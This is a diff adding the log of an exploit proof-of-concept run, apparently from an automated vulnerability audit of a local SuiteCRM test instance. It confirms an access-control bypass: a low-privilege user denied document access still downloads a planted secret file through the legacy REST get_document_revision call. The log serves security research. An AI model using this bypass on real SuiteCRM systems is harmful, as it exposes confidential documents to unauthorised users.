@@ -1,0 +1,26 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-003/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-003/../.venv
+========================================================================
+VULN-003: get_document_revision IDOR -- download any document's file with no ACL
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web + legacy REST session
+[SETUP] create fresh low-privilege user
+[OK] low-priv user: mod_e59288ca id=77b75a4b-27f2-4ba0-8a5f-ce1486e74e62
+[SETUP] restrict Documents view+list = NONE for a fresh Role, assign ONLY to this user
+[OK] role 45379f4d-4ab5-442c-bf43-ae375ff48393 assigned
+[SETUP] admin creates a victim Document (admin-owned)
+[OK] victim Document id=4e293d47-5214-459a-b4ee-a3e4c37f4494 name='Stage10 VULN-003 target doc_2baaa904'
+[SETUP] admin attaches a revision with a random secret payload (b'CVEHUNTER-SECRET-FILE-doc_53f458f3\n')
+[OK] victim DocumentRevision id=affb82db-8de0-4a69-a01b-85afc47415ff
+[INFO] app-container disk read of upload/affb82db-8de0-4a69-a01b-85afc47415ff: b'CVEHUNTER-SECRET-FILE-doc_53f458f3\n'
+[OK] on-disk file content independently matches the planted secret
+[SETUP] low-priv user logs in fresh over legacy REST (Role applies to this new session)
+[STEP] get_entry on Documents/<doc_id> (ACL'd sibling) as low-priv
+[INFO] get_entry() response: {'name': 'Access Denied', 'number': 40, 'description': 'You do not have access'}
+[PROOF] ACL'd get_entry(): denied/empty = True (expected True -- checkACLAccess('DetailView') should block it)
+[STEP] get_document_revision on the revision id (VULNERABLE sink), SAME low-priv session
+[INFO] get_document_revision() returned filename='secret.txt', 35 bytes decoded
+[PROOF] low-priv user (Documents view=list=NONE via Role 45379f4d-4ab5-442c-bf43-ae375ff48393) -- get_entry()=DENIED; get_document_revision()=LEAKED EXACT FILE BYTES
+[OK] Confirmed: get_document_revision returns the exact file bytes to a user whose ACL'd get_entry() call on the parent Document is denied.
+==> VULN-003: CONFIRMED — low-priv user w/ Documents view=list=NONE downloaded revision affb82db-8de0-4a69-a01b-85afc47415ff via get_document_revision; bytes match planted secret b'CVEHUNTER-SECRET-FILE-doc_53f458f3\n'; get_entry() on the parent Document via the same session was denied
